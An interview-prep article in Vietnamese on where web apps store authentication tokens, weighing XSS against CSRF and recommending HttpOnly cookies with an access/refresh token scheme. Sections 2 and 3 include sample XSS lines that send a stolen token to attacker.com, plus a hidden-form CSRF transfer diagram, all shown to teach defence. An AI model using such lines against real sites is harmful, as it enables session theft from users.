# Bẫy Phỏng Vấn — Token Nên Lưu Ở Đâu?

> Phân tích chi tiết 4 cách lưu token (localStorage, Cookie thường, HttpOnly Cookie, Memory), so sánh XSS vs CSRF, Access Token + Refresh Token combo strategy, cách migrate thực tế, và chiến lược phòng thủ nhiều lớp.
> Độ khó: ⭐️⭐️⭐️ | Thời gian đọc: ~20 phút

---

## Mục Lục

1. [Bốn Cách Lưu Token — Ưu Nhược Điểm](#1-bốn-cách-lưu-token--ưu-nhược-điểm)
2. [localStorage — Tiện Nhưng Nguy Hiểm](#2-localstorage--tiện-nhưng-nguy-hiểm)
3. [Cookie Thường — Tệ Hơn localStorage](#3-cookie-thường--tệ-hơn-localstorage)
4. [HttpOnly Cookie — Giải Pháp Khuyên Dùng](#4-httponly-cookie--giải-pháp-khuyên-dùng)
5. [Memory — Bảo Mật Cực Cao](#5-memory--bảo-mật-cực-cao)
6. [Cái Giá Của HttpOnly Cookie — Đối Mặt CSRF](#6-cái-giá-của-httponly-cookie--đối-mặt-csrf)
7. [Tại Sao Chống CSRF Dễ Hơn Chống XSS?](#7-tại-sao-chống-csrf-dễ-hơn-chống-xss)
8. [Migration Thực Tế — localStorage → HttpOnly Cookie](#8-migration-thực-tế--localstorage--httponly-cookie)
9. [Nếu Chưa Thể Migrate — Biện Pháp Giảm Thiểu](#9-nếu-chưa-thể-migrate--biện-pháp-giảm-thiểu)
10. [Ultimate — Access Token + Refresh Token](#10-ultimate--access-token--refresh-token)
11. [Tổng Kết & Khuyến Nghị](#11-tổng-kết--khuyến-nghị)
12. [Câu Hỏi Phỏng Vấn](#12-câu-hỏi-phỏng-vấn)

---

## 1. Bốn Cách Lưu Token — Ưu Nhược Điểm

```
TỔNG QUAN 4 PHƯƠNG PHÁP:
═══════════════════════════════════════════════════════════════

  ┌──────────────────┬──────────────┬──────────────┬──────────────┐
  │ Cách lưu         │ XSS đọc     │ CSRF tự gửi  │ Khuyến nghị  │
  │                  │ được không?  │ không?        │              │
  ├──────────────────┼──────────────┼──────────────┼──────────────┤
  │ localStorage     │ ✅ ĐỌC ĐƯỢC │ ❌ Không      │ ⚠️ Không     │
  │                  │              │               │ khuyến nghị  │
  ├──────────────────┼──────────────┼──────────────┼──────────────┤
  │ Cookie thường    │ ✅ ĐỌC ĐƯỢC │ ✅ TỰ GỬI    │ ❌ Không     │
  │                  │              │               │ khuyến nghị  │
  ├──────────────────┼──────────────┼──────────────┼──────────────┤
  │ HttpOnly Cookie  │ ❌ KHÔNG     │ ✅ TỰ GỬI    │ ⭐ Khuyên    │
  │                  │ ĐỌC ĐƯỢC    │               │ dùng         │
  ├──────────────────┼──────────────┼──────────────┼──────────────┤
  │ Memory (JS var)  │ ❌ KHÔNG     │ ❌ Không      │ ⚠️ An toàn   │
  │                  │ (trừ runtime)│               │ nhưng mất khi│
  │                  │              │               │ refresh      │
  └──────────────────┴──────────────┴──────────────┴──────────────┘

  TRỰC QUAN:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  localStorage ──────── XSS đọc được ✅                   │
  │                    └── CSRF tự gửi  ❌                   │
  │                                                          │
  │  Cookie thường ─────── XSS đọc được ✅  ← TỆ NHẤT!      │
  │                    └── CSRF tự gửi  ✅  ← Cả hai đều bị│
  │                                                          │
  │  HttpOnly Cookie ───── XSS đọc được ❌  ← AN TOÀN!      │
  │                    └── CSRF tự gửi  ✅  ← Nhưng dễ chặn│
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  LOGIC CHỌN:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  XSS = KHÓ chống hoàn toàn (attack surface RẤT RỘNG)   │
  │  CSRF = DỄ chống (SameSite + CSRF Token)                │
  │                                                          │
  │  → Chặn XSS đánh cắp token TRƯỚC (HttpOnly)             │
  │  → Sau đó xử lý CSRF (dễ hơn nhiều)                     │
  │  → "Hai hại chọn bên nhẹ hơn"                           │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 2. localStorage — Tiện Nhưng Nguy Hiểm

```
LOCALSTORAGE — CÁCH PHỔ BIẾN NHẤT:
═══════════════════════════════════════════════════════════════

  Đa số dự án bắt đầu như thế này:

  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  // Đăng nhập thành công                                 │
  │  localStorage.setItem('token', response.accessToken);   │
  │                                                          │
  │  // Gửi request                                          │
  │  const token = localStorage.getItem('token');            │
  │  fetch('/api/user', {                                    │
  │    headers: { Authorization: `Bearer ${token}` }        │
  │  });                                                     │
  │                                                          │
  │  ✅ Ưu điểm:                                             │
  │  → Đơn giản, tiện lợi                                   │
  │  → CSRF KHÔNG ảnh hưởng (token gửi qua header,          │
  │    không tự động attach)                                 │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ❌ LỖ HỔNG CHẾT NGƯỜI — XSS ĐỌC ĐƯỢC:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  localStorage HOÀN TOÀN exposed với JavaScript.          │
  │  Nếu trang có BẤT KỲ lỗ hổng XSS nào:                  │
  │                                                          │
  │  // Attacker inject script vào trang                     │
  │  fetch('https://attacker.com/steal?token='              │
  │    + localStorage.getItem('token'))                      │
  │                                                          │
  │  → 1 dòng code = ĐÁN CẮP token!                        │
  │  → Attacker impersonate user                             │
  │  → Gọi API với token bị đánh cắp                        │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  "CODE TÔI KHÔNG CÓ XSS" — THỰC TẾ:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  XSS xảy ra DỄ DÀNG hơn bạn nghĩ:                      │
  │                                                          │
  │  ① innerHTML không escape:                               │
  │     element.innerHTML = userInput; // ← XSS!            │
  │                                                          │
  │  ② Third-party script bị nhiễm độc:                     │
  │     <script src="analytics-cdn.js">  // ← compromised! │
  │                                                          │
  │  ③ URL parameter render trực tiếp:                      │
  │     ?name=<script>alert(1)</script>                     │
  │                                                          │
  │  ④ Rich text editor, Markdown renderer                  │
  │                                                          │
  │  ⑤ JSON data inject vào HTML                            │
  │                                                          │
  │  → Dự án càng lớn → càng dễ BỎ SÓT                     │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 3. Cookie Thường — Tệ Hơn localStorage

```
COOKIE THƯỜNG — TỆ NHẤT TRONG 3 CÁCH:
═══════════════════════════════════════════════════════════════

  "Lưu vào cookie có an toàn hơn không?"
  → NẾU là cookie THƯỜNG → KHÔNG, còn TỆ HƠN!

  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  // Set cookie thường                                    │
  │  document.cookie = `token=${response.accessToken}`;     │
  │                                                          │
  │  // Attacker XSS script:                                 │
  │  const token = document.cookie                           │
  │    .split('token=')[1];                                  │
  │  fetch('https://attacker.com/steal?token=' + token);    │
  │                                                          │
  │  → XSS VẪN ĐỌC ĐƯỢC (document.cookie accessible)       │
  │  → CSRF CŨNG TỰ GỬI (browser auto-attach cookie)       │
  │                                                          │
  │  = LOSE-LOSE! Bị cả XSS lẫn CSRF!                      │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  SO SÁNH VỚI LOCALSTORAGE:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  localStorage:                                           │
  │  → XSS đọc được ❌                                      │
  │  → CSRF không ảnh hưởng ✅ (token gửi qua header)      │
  │  → Chỉ bị 1 loại attack                                 │
  │                                                          │
  │  Cookie thường:                                          │
  │  → XSS đọc được ❌                                      │
  │  → CSRF tự gửi ❌ (browser auto-attach)                 │
  │  → Bị CẢ 2 loại attack → TỆ HƠN localStorage!         │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 4. HttpOnly Cookie — Giải Pháp Khuyên Dùng

```
HTTPONLY COOKIE — JS KHÔNG THỂ ĐỌC:
═══════════════════════════════════════════════════════════════

  Ưu điểm cốt lõi 1 câu:
  "JavaScript KHÔNG THỂ đọc được cookie này"

  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  // Backend set cookie (Node.js)                         │
  │  res.cookie('access_token', token, {                     │
  │    httpOnly: true,   // ← JS KHÔNG đọc được!            │
  │    secure: true,     // ← Chỉ gửi qua HTTPS             │
  │    sameSite: 'lax',  // ← Chống CSRF                     │
  │    maxAge: 3600000   // ← 1 giờ hết hạn                 │
  │  });                                                     │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  TẠI SAO AN TOÀN HƠN:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  // Frontend gửi request — browser TỰ ĐỘNG attach       │
  │  fetch('/api/user', {                                    │
  │    credentials: 'include'  // ← browser gửi cookie      │
  │  });                                                     │
  │                                                          │
  │  // Attacker XSS script:                                 │
  │  document.cookie  // ← KHÔNG THẤY HttpOnly cookie!      │
  │  // → Attacker KHÔNG THỂ đánh cắp token!                │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  4 THUỘC TÍNH QUAN TRỌNG:
  ┌──────────────────┬──────────────────────────────────────┐
  │ httpOnly: true   │ JS không đọc được → chặn XSS steal  │
  ├──────────────────┼──────────────────────────────────────┤
  │ secure: true     │ Chỉ gửi qua HTTPS → chặn MITM      │
  ├──────────────────┼──────────────────────────────────────┤
  │ sameSite: 'lax'  │ Chặn cross-site POST → chống CSRF   │
  ├──────────────────┼──────────────────────────────────────┤
  │ maxAge           │ Thời gian hết hạn → giới hạn rủi ro │
  └──────────────────┴──────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 5. Memory — Bảo Mật Cực Cao

```
MEMORY STORAGE — LƯU TOKEN TRONG BIẾN JS:
═══════════════════════════════════════════════════════════════

  Lưu token trong biến JavaScript thay vì persistent storage.

  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  let inMemoryToken = null;                               │
  │                                                          │
  │  // Đăng nhập thành công                                 │
  │  const login = async () => {                             │
  │    const response = await loginAPI(username, password);  │
  │    inMemoryToken = response.data.token;                  │
  │  };                                                      │
  │                                                          │
  │  // Request interceptor                                  │
  │  axios.interceptors.request.use((config) => {            │
  │    if (inMemoryToken) {                                  │
  │      config.headers.Authorization =                      │
  │        `Bearer ${inMemoryToken}`;                        │
  │    }                                                     │
  │    return config;                                        │
  │  });                                                     │
  │                                                          │
  │  // Page refresh / tab close → token BIẾN MẤT!          │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ✅ ƯU ĐIỂM:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → BẢO MẬT CỰC CAO                                     │
  │  → Token chỉ tồn tại trong MEMORY của page hiện tại    │
  │  → Tắt page / refresh → token LẬP TỨC biến mất        │
  │  → XSS khó steal liên tục (trừ khi script ở trong      │
  │    cùng runtime)                                        │
  │  → CSRF KHÔNG ảnh hưởng (token gửi qua header,          │
  │    không tự động attach như cookie)                      │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ❌ NHƯỢC ĐIỂM:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → UX TỆ: Refresh page = mất token = ĐĂNG NHẬP LẠI!   │
  │  → CHẾT NGƯỜI cho SPA (React/Vue)                       │
  │  → User mở tab mới? → phải login lại!                  │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  → PHÙ HỢP: Hệ thống YÊU CẦU bảo mật CỰC CAO
    (ngân hàng, sàn giao dịch) VÀ chấp nhận login thường xuyên.
  → THỰC TẾ: Ít ai dùng standalone, thường KẾT HỢP
    với Refresh Token (xem §10).

═══════════════════════════════════════════════════════════════
```

---

## 6. Cái Giá Của HttpOnly Cookie — Đối Mặt CSRF

```
HTTPONLY GIẢI QUYẾT XSS, NHƯNG ĐỐI MẶT CSRF:
═══════════════════════════════════════════════════════════════

  Cookie TỰ ĐỘNG gửi → attacker lợi dụng:

  CSRF ATTACK FLOW:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  User         Bank Website         Malicious Site       │
  │   │                │                     │               │
  │   │──── Login ────►│                     │               │
  │   │◄── HttpOnly ───│                     │               │
  │   │    Cookie set  │                     │               │
  │   │                │                     │               │
  │   │──── Visit ──────────────────────────►│               │
  │   │                │                     │               │
  │   │  ◄── Hidden form auto-submit ───────│               │
  │   │    (POST /transfer?to=attacker)      │               │
  │   │                │                     │               │
  │   │──── Request ──►│                     │               │
  │   │  (browser TỰ   │                     │               │
  │   │   ĐỘNG gửi     │                     │               │
  │   │   cookie!)     │                     │               │
  │   │                │                     │               │
  │   │           ⚠️ Chuyển tiền thành công! │               │
  │   │           User KHÔNG HỀ BIẾT!        │               │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

### Cách Chống CSRF

```
2 TẦNG PHÒNG THỦ CSRF:
═══════════════════════════════════════════════════════════════

  TẦNG 1: SameSite ATTRIBUTE (đơn giản nhất):
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  res.cookie('access_token', token, {                     │
  │    httpOnly: true,                                       │
  │    secure: true,                                         │
  │    sameSite: 'lax'  // ← KEY CONFIG!                     │
  │  });                                                     │
  │                                                          │
  │  3 giá trị SameSite:                                     │
  │  ┌───────────┬────────────────────────────────────────┐ │
  │  │ strict    │ Cross-site HOÀN TOÀN không gửi cookie │ │
  │  │           │ ⭐ An toàn nhất                        │ │
  │  │           │ ⚠️ External link vào = phải login lại  │ │
  │  ├───────────┼────────────────────────────────────────┤ │
  │  │ lax       │ GET navigation: GỬI                    │ │
  │  │ (default) │ POST cross-site: KHÔNG GỬI            │ │
  │  │           │ ⭐ Đủ cho đa số scenarios              │ │
  │  │           │ Chrome default từ 2020                 │ │
  │  ├───────────┼────────────────────────────────────────┤ │
  │  │ none      │ Luôn gửi (cần secure: true)           │ │
  │  │           │ ⚠️ KHÔNG bảo vệ CSRF                  │ │
  │  └───────────┴────────────────────────────────────────┘ │
  │                                                          │
  │  → sameSite: 'lax' chặn đa số CSRF                      │
  │    (POST cross-site bị block)                            │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  TẦNG 2: CSRF TOKEN (nghiêm ngặt hơn):
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  // Backend: tạo CSRF token, set cookie (KHÔNG httpOnly)│
  │  const csrfToken = crypto.randomUUID();                  │
  │  res.cookie('csrf_token', csrfToken);                    │
  │  // ^ Frontend CẦN đọc → không httpOnly                 │
  │                                                          │
  │  // Frontend: đọc CSRF token, gửi kèm header            │
  │  fetch('/api/transfer', {                                │
  │    method: 'POST',                                       │
  │    headers: {                                            │
  │      'X-CSRF-Token': document.cookie                    │
  │        .match(/csrf_token=([^;]+)/)?.[1]                │
  │    },                                                    │
  │    credentials: 'include'                                │
  │  });                                                     │
  │                                                          │
  │  // Backend: verify                                      │
  │  if (req.cookies.csrf_token !==                          │
  │      req.headers['x-csrf-token']) {                      │
  │    return res.status(403).send('CSRF mismatch');         │
  │  }                                                       │
  │                                                          │
  │  TẠI SAO HOẠT ĐỘNG:                                      │
  │  → Attacker có thể làm browser TỰ GỬI cookie           │
  │  → Nhưng KHÔNG THỂ ĐỌC nội dung cookie                  │
  │    để construct request header X-CSRF-Token!             │
  │  → Same-Origin Policy chặn cross-origin đọc cookie      │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 7. Tại Sao Chống CSRF Dễ Hơn Chống XSS?

```
ĐIỂM MẤU CHỐT — LÝ DO CỐT LÕI CHỌN HTTPONLY:
═══════════════════════════════════════════════════════════════

  XSS — ATTACK SURFACE CỰC RỘNG:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  ① User input rendering (comments, search, URL params) │
  │  ② Third-party scripts (ads, analytics, CDN)            │
  │  ③ Rich text editor                                     │
  │  ④ Markdown renderer                                    │
  │  ⑤ JSON data inject vào HTML                            │
  │  ⑥ innerHTML, dangerouslySetInnerHTML                   │
  │  ⑦ Quên escape 1 chỗ = lỗ hổng!                        │
  │  ⑧ Third-party library có bug                           │
  │                                                          │
  │  → Code càng nhiều → càng dễ BỎ SÓT                    │
  │  → KHÔNG THỂ đảm bảo 100% không có XSS                 │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  CSRF — DỄ CHẶN, PHƯƠNG PHÁP CHUẨN HÓA:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  ① sameSite: 'lax' → 1 dòng config = chặn đa số       │
  │  ② CSRF Token nếu cần nghiêm ngặt hơn                  │
  │  ③ Attack surface hẹp: chỉ form submit + link redirect │
  │  ④ Phương pháp CHUẨN HÓA, well-documented              │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  SO SÁNH:
  ┌─────────────────┬─────────────────┬─────────────────────┐
  │                 │ XSS              │ CSRF                │
  ├─────────────────┼─────────────────┼─────────────────────┤
  │ Attack surface  │ CỰC RỘNG        │ HẸP                 │
  │                 │ (input, scripts, │ (form, link)        │
  │                 │  editors, CDN..) │                     │
  ├─────────────────┼─────────────────┼─────────────────────┤
  │ Phòng thủ       │ Nhiều điểm,     │ 1-2 config          │
  │                 │ dễ sót          │ (SameSite + Token)  │
  ├─────────────────┼─────────────────┼─────────────────────┤
  │ Đảm bảo 100%?  │ KHÔNG THỂ       │ GẦN NHƯ CÓ THỂ     │
  ├─────────────────┼─────────────────┼─────────────────────┤
  │ Hậu quả nếu bị │ ĐÁNH CẮP TOKEN! │ Gửi request giả     │
  │                 │ (impersonate    │ (nhưng không đọc    │
  │                 │  hoàn toàn)     │  được response)     │
  └─────────────────┴─────────────────┴─────────────────────┘

  KẾT LUẬN:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  "Hai hại chọn bên nhẹ hơn"                             │
  │                                                          │
  │  → CHẶN XSS đánh cắp token trước (HttpOnly Cookie)     │
  │  → Rồi tập trung chống CSRF (SameSite + Token)         │
  │  → CSRF dễ chống hơn XSS RẤT NHIỀU!                    │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 8. Migration Thực Tế — localStorage → HttpOnly Cookie

```
MIGRATE TỪ LOCALSTORAGE SANG HTTPONLY COOKIE:
═══════════════════════════════════════════════════════════════

  ⚠️ Cần phối hợp FRONTEND + BACKEND
  Nhưng phạm vi thay đổi KHÔNG LỚN:

  ┌──────────────────────────────────────────────────────────┐
  │  BACKEND CHANGES                                         │
  └──────────────────────────────────────────────────────────┘

  // ❌ TRƯỚC: trả token trong JSON body
  app.post('/api/login', (req, res) => {
    const token = generateToken(user);
    res.json({ accessToken: token });
  });

  // ✅ SAU: set HttpOnly Cookie
  app.post('/api/login', (req, res) => {
    const token = generateToken(user);
    res.cookie('access_token', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 3600000        // 1 giờ
    });
    res.json({ success: true });  // Không trả token!
  });

  ┌──────────────────────────────────────────────────────────┐
  │  FRONTEND CHANGES                                        │
  └──────────────────────────────────────────────────────────┘

  // ❌ TRƯỚC: tự lấy token từ localStorage, gắn header
  fetch('/api/user', {
    headers: {
      Authorization: `Bearer ${localStorage.getItem('token')}`
    }
  });

  // ✅ SAU: chỉ cần credentials: 'include'
  fetch('/api/user', {
    credentials: 'include'  // Browser tự gửi cookie!
  });

  // Nếu dùng axios — config global:
  axios.defaults.withCredentials = true;

  ┌──────────────────────────────────────────────────────────┐
  │  LOGOUT                                                  │
  └──────────────────────────────────────────────────────────┘

  // ❌ TRƯỚC:
  localStorage.removeItem('token');

  // ✅ SAU: Backend clear cookie
  app.post('/api/logout', (req, res) => {
    res.clearCookie('access_token');
    res.json({ success: true });
  });

═══════════════════════════════════════════════════════════════
```

---

## 9. Nếu Chưa Thể Migrate — Biện Pháp Giảm Thiểu

```
KHI BẮT BUỘC PHẢI DÙNG LOCALSTORAGE:
═══════════════════════════════════════════════════════════════

  Dự án legacy, backend chưa sẵn sàng thay đổi?
  → Ít nhất phải có các biện pháp SAU:

  ① NGHIÊM NGẶT CHỐNG XSS:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → Dùng textContent thay innerHTML                      │
  │     element.textContent = userInput; // ✅ SAFE         │
  │     element.innerHTML = userInput;   // ❌ XSS!         │
  │                                                          │
  │  → Escape tất cả user input                             │
  │                                                          │
  │  → Config CSP header:                                    │
  │     Content-Security-Policy:                             │
  │       script-src 'self';                                │
  │       style-src 'self' 'unsafe-inline';                 │
  │                                                          │
  │  → Rich text: dùng DOMPurify                             │
  │     import DOMPurify from 'dompurify';                   │
  │     el.innerHTML = DOMPurify.sanitize(dirty);            │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ② TOKEN HẾT HẠN NHANH:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → Access token: 15-30 phút                              │
  │  → Kết hợp Refresh Token mechanism:                      │
  │                                                          │
  │    Access Token (ngắn) ← lưu localStorage               │
  │    Refresh Token (dài) ← lưu HttpOnly Cookie            │
  │                                                          │
  │  → Nếu access token bị đánh cắp:                        │
  │    → Chỉ dùng được 15-30 phút                           │
  │    → Refresh token attacker KHÔNG lấy được              │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ③ SENSITIVE OPS CẦN XÁC THỰC LẠI:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → Chuyển tiền, đổi mật khẩu, xóa tài khoản...        │
  │  → YÊU CẦU nhập lại mật khẩu hoặc OTP                  │
  │  → Dù attacker có token → vẫn KHÔNG THỂ                 │
  │    thực hiện thao tác nhạy cảm                          │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  ④ GIÁM SÁT BẤT THƯỜNG:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  → Cùng account login từ nhiều location → alert         │
  │  → Token usage frequency bất thường → alert             │
  │  → Tự động revoke token khi phát hiện anomaly           │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 10. Ultimate — Access Token + Refresh Token

```
DUAL TOKEN ARCHITECTURE — CÂN BẰNG BẢO MẬT + UX:
═══════════════════════════════════════════════════════════════

  Giải quyết vấn đề: Memory storage AN TOÀN nhưng UX TỆ.
  → Kết hợp Memory + HttpOnly Cookie = hoàn hảo!

  FLOW:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  ① USER LOGIN (nhập password)                            │
  │     │                                                    │
  │     ▼                                                    │
  │  ② SERVER trả về 2 TOKEN:                                │
  │     ┌───────────────┬───────────────────────────────┐   │
  │     │ access_token  │ Ngắn hạn (2h)                 │   │
  │     │               │ Dùng cho business API requests│   │
  │     ├───────────────┼───────────────────────────────┤   │
  │     │ refresh_token │ Dài hạn (7 ngày)              │   │
  │     │               │ CHỈ dùng để lấy access_token  │   │
  │     │               │ mới, KHÔNG có quyền gọi API  │   │
  │     └───────────────┴───────────────────────────────┘   │
  │                                                          │
  │  ③ STORAGE STRATEGY:                                     │
  │     ┌───────────────┬───────────────────────────────┐   │
  │     │ access_token  │ Lưu trong MEMORY (JS var)     │   │
  │     │               │ → XSS steal? Chỉ 2h validity  │   │
  │     │               │ → Risk controllable!          │   │
  │     ├───────────────┼───────────────────────────────┤   │
  │     │ refresh_token │ Lưu trong HTTPONLY COOKIE      │   │
  │     │               │ → Dài hạn → PHẢI bảo vệ chặt │   │
  │     │               │ → JS KHÔNG đọc được!          │   │
  │     │               │ → CSRF? Chỉ exchange được     │   │
  │     │               │   access_token mới (vô hại)   │   │
  │     └───────────────┴───────────────────────────────┘   │
  │                                                          │
  │  ④ SEAMLESS REFRESH:                                     │
  │     access_token hết hạn                                 │
  │       │                                                  │
  │       ▼                                                  │
  │     Frontend TỰ ĐỘNG gọi /api/refresh                   │
  │     (browser gửi refresh_token cookie)                   │
  │       │                                                  │
  │       ▼                                                  │
  │     Server trả access_token MỚI                          │
  │     → Lưu vào memory                                    │
  │     → User KHÔNG HỀ BIẾT!                               │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

  TẠI SAO AN TOÀN:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  XSS steal access_token (memory)?                        │
  │  → Chỉ valid 2h → risk controllable                     │
  │                                                          │
  │  XSS steal refresh_token (HttpOnly cookie)?              │
  │  → KHÔNG THỂ đọc! (HttpOnly)                            │
  │                                                          │
  │  CSRF dùng refresh_token?                                │
  │  → Chỉ lấy được access_token mới                        │
  │  → Nhưng access_token ở MEMORY                          │
  │  → Attacker KHÔNG LẤY ĐƯỢC access_token!                │
  │  → Không gọi được business API!                          │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

### Implementation

```javascript
// ══════════════════════════════════════
// BACKEND — Login endpoint
// ══════════════════════════════════════
app.post("/api/login", (req, res) => {
  const user = authenticate(req.body);

  // Access token — short-lived
  const accessToken = jwt.sign({ userId: user.id }, SECRET, {
    expiresIn: "2h",
  });

  // Refresh token — long-lived, HttpOnly cookie
  const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, {
    expiresIn: "7d",
  });

  res.cookie("refresh_token", refreshToken, {
    httpOnly: true, // JS KHÔNG đọc được
    secure: true, // HTTPS only
    sameSite: "lax", // Chống CSRF
    path: "/api/refresh", // CHỈ gửi cho refresh endpoint!
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
  });

  // Access token trả trong body → frontend lưu memory
  res.json({ accessToken });
});

// ══════════════════════════════════════
// BACKEND — Refresh endpoint
// ══════════════════════════════════════
app.post("/api/refresh", (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  if (!refreshToken) return res.status(401).send("No refresh token");

  try {
    const payload = jwt.verify(refreshToken, REFRESH_SECRET);
    const newAccessToken = jwt.sign({ userId: payload.userId }, SECRET, {
      expiresIn: "2h",
    });
    res.json({ accessToken: newAccessToken });
  } catch {
    res.status(403).send("Invalid refresh token");
  }
});
```

```javascript
// ══════════════════════════════════════
// FRONTEND — Token management
// ══════════════════════════════════════
let accessToken = null; // Lưu trong MEMORY!

// Login
async function login(username, password) {
  const res = await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ username, password }),
    headers: { "Content-Type": "application/json" },
    credentials: "include", // Để browser nhận cookie
  });
  const data = await res.json();
  accessToken = data.accessToken; // Lưu memory!
}

// Axios interceptor — auto refresh
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !error.config._retry) {
      error.config._retry = true;

      // Gọi refresh endpoint (browser tự gửi HttpOnly cookie)
      const res = await fetch("/api/refresh", {
        method: "POST",
        credentials: "include",
      });

      if (res.ok) {
        const data = await res.json();
        accessToken = data.accessToken; // Update memory!

        // Retry request gốc với token mới
        error.config.headers.Authorization = `Bearer ${accessToken}`;
        return axios(error.config);
      }
    }
    return Promise.reject(error);
  },
);

// Request interceptor — attach access token
axios.interceptors.request.use((config) => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});
```

> **Key insight `path: '/api/refresh'`**: Refresh token cookie CHỈ được gửi khi gọi `/api/refresh`, không gửi cho các API khác → giảm thiểu attack surface hơn nữa.

---

## 11. Tổng Kết & Khuyến Nghị

```
BẢNG SO SÁNH TỔNG KẾT:
═══════════════════════════════════════════════════════════════

  ┌────────────────┬────────────────┬─────────────────┬──────────────────┐
  │ Nơi lưu        │ Ưu điểm        │ Nhược điểm      │ Phù hợp         │
  ├────────────────┼────────────────┼─────────────────┼──────────────────┤
  │ Web Storage    │ Đơn giản, dễ  │ XSS steal được! │ ❌ Không khuyến  │
  │ (localStorage, │ dùng           │                 │ nghị cho token   │
  │  sessionStorage│                │                 │ nhạy cảm         │
  │ )              │                │                 │                  │
  ├────────────────┼────────────────┼─────────────────┼──────────────────┤
  │ Cookie         │ Chống XSS      │ CSRF cần phòng  │ Web app truyền   │
  │ (HttpOnly)     │ (HttpOnly)     │ thủ             │ thống (kèm CSRF │
  │                │                │                 │ protection)      │
  ├────────────────┼────────────────┼─────────────────┼──────────────────┤
  │ Memory         │ Bảo mật CỰC   │ Refresh = mất   │ Yêu cầu bảo mật│
  │ (JS variable)  │ CAO            │ token, UX tệ    │ CỰC CAO, chấp  │
  │                │                │                 │ nhận login lại  │
  ├────────────────┼────────────────┼─────────────────┼──────────────────┤
  │ Combo:         │ An toàn + UX   │ Kiến trúc phức  │ ⭐ MODERN SPA    │
  │ Access (memory)│ MỀM MẠI       │ tạp hơn         │ Best Practice   │
  │ + Refresh      │ Seamless       │                 │ (React/Vue app) │
  │ (HttpOnly)     │ refresh        │                 │                  │
  └────────────────┴────────────────┴─────────────────┴──────────────────┘

  KHUYẾN NGHỊ:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  ① Internal tool, bảo mật thấp:                          │
  │     → localStorage OK (biết rủi ro)                      │
  │                                                          │
  │  ② Web app truyền thống (SSR, multi-page):               │
  │     → HttpOnly Cookie + CSRF protection                  │
  │                                                          │
  │  ③ Modern SPA (React/Vue):                               │
  │     → ⭐ Access Token (memory) + Refresh Token           │
  │       (HttpOnly Cookie) — HIGHLY RECOMMENDED             │
  │                                                          │
  │  → Bảo mật KHÔNG tuyệt đối, là TRADE-OFF                │
  │  → Hiểu ưu nhược điểm → chọn PHÙ HỢP business         │
  │                                                          │
  └──────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════
```

---

## 12. Câu Hỏi Phỏng Vấn

### Q1: Token nên lưu ở đâu? (Bản ngắn 30 giây)

```
TRẢ LỜI:
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  Tuỳ business scenario:                                      │
│                                                              │
│  → Traditional web: HttpOnly Cookie + CSRF protection       │
│  → Modern SPA: Access Token (memory) + Refresh Token        │
│    (HttpOnly Cookie) — BEST PRACTICE!                       │
